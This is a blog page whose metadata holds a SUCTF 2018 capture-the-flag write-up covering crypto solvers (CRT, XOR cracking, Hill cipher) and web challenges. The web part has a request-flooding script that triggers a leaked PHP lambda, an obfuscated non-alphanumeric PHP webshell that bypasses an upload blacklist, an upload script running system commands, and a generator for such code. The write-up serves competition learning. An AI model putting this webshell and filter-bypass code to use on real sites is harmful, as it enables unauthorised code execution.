<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>suctf writeup | 闲言语</title><meta name=keywords content><meta name=description content="MISC sandgame game.py
1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(&#34;hex&#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(&#34;sand.txt&#34;, &#34;w&#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+&#34;\n&#34;) solution.py
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 <= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/180527suctf/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="suctf writeup"><meta property="og:description" content="MISC sandgame game.py
1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(&#34;hex&#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(&#34;sand.txt&#34;, &#34;w&#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+&#34;\n&#34;) solution.py
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 <= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/180527suctf/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-05-27T22:07:58+08:00"><meta property="article:modified_time" content="2018-05-27T22:07:58+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="suctf writeup"><meta name=twitter:description content="MISC sandgame game.py
1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(&#34;hex&#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(&#34;sand.txt&#34;, &#34;w&#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+&#34;\n&#34;) solution.py
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 <= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"suctf writeup","item":"https://ret2neo.cn/post/180527suctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"suctf writeup","name":"suctf writeup","description":"MISC sandgame game.py\n1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(\u0026#34;hex\u0026#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(\u0026#34;sand.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+\u0026#34;\\n\u0026#34;) solution.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 \u0026lt;= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!","keywords":[],"articleBody":"MISC sandgame game.py\n1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(\"hex\"), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(\"sand.txt\", \"w\") as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+\"\\n\") solution.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 \u003c= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!=0: a,b = b%a,a return b #定义一个函数，参数分别为a,n，返回值为b def findModReverse(a,m):#这个扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] sand = [222, 203, 33, 135, 203, 62, 227, 82, 239, 82, 11, 220, 74, 92, 8, 308, 195, 165, 87, 4] M=1 for i in holes: M*=i s=0 for i,j in enumerate(holes): mi=j Mi=M/mi s=s+findModReverse(Mi,mi)*sand[i]*Mi print str(hex(s%M)[2:-1]).decode('hex') # This_is_the_CRT_xwg) 韩信点兵问题，根据中国剩余定理构造通解\nCycle cycle.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import flag def encryt(key, plain): cipher = \"\" for i in range(len(plain)): cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i])) return cipher def getPlainText(): plain = \"\" with open(\"plain.txt\") as f: while True: line = f.readline() if line: plain += line else: break return plain def main(): key = flag.flag assert key.startswith(\"flag{\") assert key.endswith(\"}\") key = key[5:-1] assert len(key) \u003e 1 assert len(key) \u003c 50 assert flag.languageOfPlain == \"English\" plain = getPlainText() cipher = encryt(key, plain) with open(\"cipher.txt\", \"w\") as f: f.write(cipher.encode(\"base_64\")) if __name__ == \"__main__\": main() cipher.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 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 类似维吉尼亚的变种，key长度远小于plain，循环异或后可统计字频，南邮CTF平台有一题相似的。详见 https://findneo.github.io/171005NuptVigenereWP/ 。稍微更改其中读取密文部分即可。flag{Something Just Like This} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 # coding:utf8 # by https://findneo.github.io/ def getCipher(file='code.txt'): '''从文件中读取十六进制串，返回十六进制数组 ''' c=''.join(map(lambda x:x.strip(),open('cipher.txt').readlines())).decode('base_64') cc= [ord(i) for i in c] # print cc,len(cc) return cc # c = open(file).read() # codeintlist = [] # codeintlist.extend( # (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) # return codeintlist def getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如{ 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] } ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool def calCorrelation(cpool): '''传入字典，形如{'e':2,'p':3} 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = {\"e\": 0.12702, \"t\": 0.09056, \"a\": 0.08167, \"o\": 0.07507, \"i\": 0.06966, \"n\": 0.06749, \"s\": 0.06327, \"h\": 0.06094, \"r\": 0.05987, \"d\": 0.04253, \"l\": 0.04025, \"c\": 0.02782, \"u\": 0.02758, \"m\": 0.02406, \"w\": 0.02360, \"f\": 0.02228, \"g\": 0.02015, \"y\": 0.01974, \"p\": 0.01929, \"b\": 0.01492, \"v\": 0.00978, \"k\": 0.00772, \"j\": 0.00153, \"x\": 0.00150, \"q\": 0.00095, \"z\": 0.00074} relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relative def analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r \u003e mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key def getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[{ 0x11:{'a':2,'b':3}, 0x12:{'e':6} }, { 0x22:{'g':1} }] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList def vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain def main(): ps = [] ks = [] ss = [] ps.extend(xrange(0xff)) ks.extend(xrange(0x20,0x80)) ss.extend(xrange(1, 50)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) print ''.join(map(chr,key)) if __name__ == '__main__': main() WEB Anonymous 1 2 3 4 5 6 7 8 9 10 11 12 \u003c?php $MY = create_function(\"\",\"die(`cat flag.php`);\"); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(\"function SUCTF_$hash(){\" .\"global \\$MY;\" .\"\\$MY();\" .\"}\"); if(isset($_GET['func_name'])){ $_GET[\"func_name\"](); die(); } show_source(__FILE__); https://www.jianshu.com/p/19e3ee990cb7\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import socket import time from multiprocessing.dummy import Pool as ThreadPool try: requests.packages.urllib3.disable_warnings() except: pass def run(i): while 1: HOST = 'web.suctf.asuri.org' PORT = 81 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall('GET /index.php HTTP/1.1\\nHost: web.suctf.asuri.org\\nConnection: Keep-Alive\\n\\n') # s.close() print 'ok' time.sleep(0.5) print requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1').content i = 8 pool = ThreadPool( i ) result = pool.map_async( run, range(i) ).get(0xffff) $flag=\"SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}\";\nGetshell 要求上传的webshell文件从第6个字符开始都不能在黑名单内。\n1 2 3 4 5 6 7 8 if($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){ $data=substr($contents,5); foreach ($black_char as $b) { if (stripos($data, $b) !== false){ die(\"illegal char\"); } } } 用burp intruder跑一遍，发现不在黑名单里的可打印字符有 $()[]_~=;. 共10个。\n跑的时候需注意Intruder=\u003epayloads=\u003epayload encoding 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。\n跑的时候可以在Intruder=\u003eoptions=\u003eGrep-Match 中选择 flag illegal ，这样就可以快速看到那些字符是合法的了。\n接下来就是构造一个由 $()[]_~=;. 组成的webshell了，主要思路来自 一些不包含数字和字母的webshell 。\n构造出的最终结果如下：\n1 \u003c?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]); 详细注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u003c?= $_=_==_;//1 $__=~一[$_];//G $___=~了[$_];//E $____=~端[$_];//T $_____=~得[$_];//A $______=~第[$_];//S $_______=~学[$_];//R $_=_.$__.$___.$____;//_GET $_=$$_;//$_GET $__=$_____.$______.$______.$___.$_______.$____;//ASSERT $__($_[_]);//ASSERT($_GET[_]); ------------------------------------------------------ http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php ?_=phpinfo(); 可以有一个更短更舒服的选择\n1 \u003c?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]); 详细注释：\n1 2 3 4 5 6 7 8 9 10 $_=_==_;//1 $__=~一[$_];//G $___=~了[$_];//E $____=~端[$_];//T $_=_.$__.$___.$____;//_GET $_=$$_;//$_GET $_[_]($_[__]);//$_GET[_]($_GET[__]); ------------------------------------------------------ http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php ?_=assert\u0026__=phpinfo(); 读取flag\n1 2 3 4 5 view-source:http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert\u0026__=system(%22ls%20-l%20/%22); http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert\u0026__=readfile(%27/Th1s_14_f14g%27); SUCTF{KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o} 上传小脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf8 import requests import re data=\"\u003c?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\" base=\"http://web.suctf.asuri.org:82/\" files = {'file': ('findneo.php', data, 'image/jpeg')} content = requests.post(base+\"upload.php\", files=files).text cmd='system(\"dir /\");' payload=base+re.match(\"[\\s\\S]*Stored in: ([a-z.0-9/]+)[\\s\\S]*\",content).group(1)+\"?_=assert\u0026__=\"+cmd print payload print requests.get(payload).content # http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert\u0026__=system(\"dir /\"); # 1Th1s_14_f14g boot etc lib\tmedia\topt root sbin sys usr # bin\tdev home lib64 mnt\tproc run srv tmp var 写了一个用上述方法生成任意字母构成的字符串的小程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # coding: UTF-8 # Author: 'findneo' # compose php code from limited whitelist: $()[]_~=;. def gendict(index='_==_',target_chars=[chr(i) for i in range(0x20,0x7f)]): sentence=\"如是我闻。一时薄伽梵。住王舍城鹫峰山顶。与大苾刍众千二百五十人俱。皆阿罗汉。诸漏已尽无复烦恼得真自在心善解脱慧善解脱。如调慧马亦如大龙。已作所作已办所办。弃诸重担逮得己利。尽诸有结正知解脱。至心自在第一究竟。除阿难陀独居学地得预流果。大迦叶波而为上首。复有五百苾刍尼众。皆阿罗汉。大胜生主而为上首。复有无量邬波索迦、邬波斯迦。皆见圣谛。复有无量无数菩萨摩诃萨众。一切皆得陀罗尼门三摩地门。住空无相无分别愿。已得诸法平等性忍。具足成就四无碍解。凡所演说辩才无尽。于五神通自在游戏。所证智断永无退失。言行威肃闻皆敬受。勇猛精进离诸懈怠。能舍亲财不顾身命。离矫离诳无染无求。等为有情而宣正法。契深法忍穷最极趣。得无所畏其心泰然。超众魔境出诸业障。摧灭一切烦恼怨敌。建正法幢伏诸邪论。声闻独觉不能测量。得心自在得法自在。业惑见障皆已解脱。择法辩说无不善巧。入深缘起生灭法门。离见随眠舍诸缠结。智慧通达诸圣谛理。曾无数劫发弘誓愿。容貌熙怡先言接引。远离颦蹙辞韵清和。赞颂善巧辩才无滞。处无边众威德肃然。抑扬自在都无所畏。多俱胝劫巧说无尽。于诸法门胜解观察。如幻如阳焰。如梦如水月。如响如空花。如像如光影。如变化事。如寻香城。虽皆无实而现似有。离下劣心说法无畏。能随证入无量法门。善知有情心行所趣。以微妙慧而度脱之。于诸有情心无挂碍。成就最上无生法忍。善入诸法平等性智。甚深法性能如实知。随其所应巧令悟入。能善宣说缘起法门。摄受无边佛国大愿。于十方界无数诸佛。等持正念常现在前。诸佛出世皆能历事。亦能劝请转正法轮。不般涅槃度无量众善能伏灭一切有情种种见缠诸烦恼焰。须臾游戏百千等持。引发无边殊胜功德。此诸菩萨具如是等妙功德海。设经无量俱胝大劫。叹不能尽。其名曰贤守菩萨摩诃萨。宝性菩萨摩诃萨。宝藏菩萨摩诃萨。宝授菩萨摩诃萨。导师菩萨摩诃萨。仁授菩萨摩诃萨。星授菩萨摩诃萨。神授菩萨摩诃萨。帝授菩萨摩诃萨。广慧菩萨摩诃萨。胜慧菩萨摩诃萨。上慧菩萨摩诃萨。增长慧菩萨摩诃萨。无边慧菩萨摩诃萨。不虚见菩萨摩诃萨。无障慧菩萨摩诃萨。善发趣菩萨摩诃萨。善勇猛菩萨摩诃萨。极精进菩萨摩诃萨。常精进菩萨摩诃萨。常加行菩萨摩诃萨。不舍轭菩萨摩诃萨。日藏菩萨摩诃萨。月藏菩萨摩诃萨。无比慧菩萨摩诃萨。观自在菩萨摩诃萨。得大势菩萨摩诃萨。妙吉祥菩萨摩诃萨。宝印手菩萨摩诃萨。摧魔力菩萨摩诃萨。金刚慧菩萨摩诃萨。金刚藏菩萨摩诃萨。常举手菩萨摩诃萨。大悲心菩萨摩诃萨。大庄严菩萨摩诃萨。庄严王菩萨摩诃萨。山峰菩萨摩诃萨。宝峰菩萨摩诃萨。德王菩萨摩诃萨。慈氏菩萨摩诃萨。如是等无量百千俱胝那庾多菩萨摩诃萨。皆法王子堪绍佛位而为上首。尔时世尊于师子座上。自敷尼师坛结跏趺坐。端身正愿住对面念。入等持王妙三摩地。诸三摩地皆摄入此三摩地中。是所流故。尔时世尊正知正念。从等持王安庠而起。以净天眼观察十方殑伽沙等诸佛世界。举身怡悦。从两足下千辐轮相。各放六十百千俱胝那庾多光。从足十指。两趺两跟。四踝两胫。两腨两膝。两股。腰胁腹背。脐中心上胸臆德字。两乳两腋。两肩两髆。两肘两臂。两腕两手。两掌十指。项咽颐颔。颊额头顶两眉两眼。两耳两鼻。口四牙。四十齿。眉间毫相。一一身分。各放六十百千俱胝那庾多光。此一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊一切毛孔皆悉熙怡。各出六十百千俱胝那庾多光。是一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊演身常光照此三千大千世界。从此展转遍照十方殑伽沙等诸佛国土。其中有情遇斯光者。必得无上正等菩提。尔时世尊从其面门出广长舌相。遍覆三千大千世界。熙怡微笑。复从舌相流出无量百千俱胝那庾多光。其光杂色。从此杂色一一光中。现宝莲花。其花千叶皆真金色。众宝庄严。绮饰鲜荣。甚可爱乐。香气芬烈。周流普熏。细滑轻软。触生妙乐。诸花台中皆有化佛结跏趺坐。演妙法音。一一法音。皆说般若波罗蜜多相应之法。有情闻者必得无上正等菩提。从此展转。流遍十方殑伽沙等诸佛世界。说法利益亦复如是。\" parse_byte=lambda c:[~i%256 for i in bytes(c, encoding='utf-8')][1] d=dict() for k in sentence: j=parse_byte(k) if chr(j) in target_chars and chr(j) not in d.keys(): d[chr(j)]=\"~{}[{}]\".format(k,index) return d def gencode(code): d=gendict(index='$_',target_chars=''.join(set(code))) res='$__='+'.'.join(map(lambda x:d[x],code)) return res code='@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~' print(gencode(code)) # \u003c?php # $_=_==_; # $__=~俱[$_].~得[$_].~住[$_].~伽[$_].~结[$_].~二[$_].~鹫[$_].~一[$_].~已[$_].~足[$_].~流[$_].~索[$_].~峰[$_].~精[$_].~山[$_].~尽[$_].~诸[$_].~宣[$_].~正[$_].~第[$_].~竟[$_].~誓[$_].~马[$_].~言[$_].~解[$_].~如[$_].~神[$_].~大[$_].~声[$_].~梵[$_].~顶[$_].~堪[$_].~城[$_].~果[$_].~坛[$_].~真[$_].~相[$_].~皆[$_].~百[$_].~是[$_].~闻[$_].~薄[$_].~数[$_].~生[$_].~响[$_].~和[$_].~摩[$_].~萨[$_].~叶[$_].~王[$_].~千[$_].~猛[$_].~苾[$_].~办[$_].~所[$_].~我[$_].~自[$_].~熙[$_].~慧[$_].~脱[$_].~烦[$_].~邬[$_].~恼[$_]; # var_dump($__); # // string(63) \"@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\" CRYPTO Magic 把magic视为256x256的由0，1组成的矩阵M，把cipher视为256x1的矩阵C，把key视为256x1的矩阵K，已知M,C，且M*K = C (.mod 2)，求K。\n可以采用Gauss-Jordan 消元法 将增广矩阵[M|C] 简化为行阶梯形矩阵，那么变化后的C就是我们的解K。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 read_to_int_array = lambda x:[map(int,list(bin(int(line,16))[2:].zfill(256))) for line in open(x).readlines()] cipher = read_to_int_array('cipher.txt')[0] magic = read_to_int_array('magic.txt') dim=len(cipher) for col in range(dim): for row in range(col,dim): if magic[row][col]==1: magic[col],magic[row]=magic[row],magic[col] cipher[col],cipher[row]=cipher[row],cipher[col] break for row in range(dim): if magic[row][col]==1 and row!=col: for each_in_row in range(dim): magic[row][each_in_row]^=magic[col][each_in_row] cipher[row]^=cipher[col] print \"flag{%s}\"%hex(int(''.join(map(str,cipher)),2))[2:-1].decode('hex') #flag{Now_you_know_the_Hill_Cipher_xwg} 参考链接：\nhttps://blog.csdn.net/u010182633/article/details/45225179 https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP 也可尝试借助matlab的 rref 。 题目备份 https://github.com/findneo/ctfgodown/tree/master/20180527-suctf\n","wordCount":"1400","inLanguage":"en","datePublished":"2018-05-27T22:07:58+08:00","dateModified":"2018-05-27T22:07:58+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/180527suctf/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body 